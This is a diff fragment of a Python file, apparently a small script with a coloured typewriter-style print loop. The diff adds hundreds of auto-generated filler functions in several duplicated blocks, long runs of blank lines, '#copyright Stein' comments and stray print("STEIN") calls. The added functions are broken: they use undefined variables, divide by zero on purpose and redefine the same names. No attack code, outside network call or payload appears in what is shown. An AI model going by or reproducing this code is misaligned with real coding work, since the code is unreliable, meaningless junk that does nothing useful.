+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     for char in "I hope you understand things now?\n":
         sys.stdout.write(Fore.YELLOW + char if char in '.,!?' else Fore.CYAN + char)
         sys.stdout.flush()
         time.sleep(0.1)
     print()
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
